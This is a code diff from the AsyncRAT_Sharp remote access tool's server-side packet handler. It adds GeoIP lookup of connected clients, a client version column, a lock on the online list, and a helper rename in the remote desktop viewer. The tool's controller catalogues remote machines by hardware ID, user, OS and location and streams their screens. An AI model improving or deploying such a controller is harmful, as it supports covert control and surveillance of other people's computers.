@@ -6,12 +6,13 @@ using System.Diagnostics;
 using System.Drawing;
 using AsyncRAT_Sharp.Forms;
 using System.IO;
-
+using cGeoIp;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
     class HandlePacket
     {
+       private static cGeoMain cNewGeoUse = new cGeoMain();
         public static void Read(Clients Client, byte[] Data)
         {
             try
@@ -28,13 +29,17 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 Client.LV = new ListViewItem();
                                 Client.LV.Tag = Client;
                                 Client.LV.Text = string.Format("{0}:{1}", Client.Client.RemoteEndPoint.ToString().Split(':')[0], Client.Client.LocalEndPoint.ToString().Split(':')[1]);
+                                string[] ipinf = cNewGeoUse.GetIpInf(Client.Client.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
+                                Client.LV.SubItems.Add(ipinf[1]);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
+                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                                 Client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
                                 Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                 Program.form1.listView1.Items.Insert(0, Client.LV);
-                                Settings.Online.Add(Client);
+                                lock (Settings.Online)
+                                    Settings.Online.Add(Client);
                             }));
                         }
                         break;
@@ -79,7 +84,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                             RD.FPS++;
                                             if (RD.sw.ElapsedMilliseconds >= 1000)
                                             {
-                                                RD.Text = "RemoteDesktop:" + Client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Helper.BytesToString(RdpStream.Length);
+                                                RD.Text = "RemoteDesktop:" + Client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                                 RD.FPS = 0;
                                                 RD.sw = Stopwatch.StartNew();
                                             }
